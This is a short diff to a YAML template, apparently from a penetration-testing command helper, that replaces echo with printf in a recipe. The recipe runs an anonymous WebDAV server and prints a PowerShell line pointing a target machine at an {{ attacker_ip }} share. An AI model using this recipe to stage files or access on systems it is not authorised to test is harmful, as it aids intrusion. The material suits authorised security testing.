@@ -7,8 +7,8 @@ metadata:
 
 content: |
   mkdir -p webdav ;\
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'To access: Set-Location \\\\{{ attacker_ip }}@{{ webdav_port }}; explorer .'; \
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----PowerShell-----                      '; \
+  printf '%s\n' 'To access: Set-Location \\\\{{ attacker_ip }}@{{ webdav_port }}; explorer .'; \
+  printf '%s\n' '================================================================'; \
   wsgidav --host=0.0.0.0 --port={{ webdav_port }} --auth=anonymous --root webdav
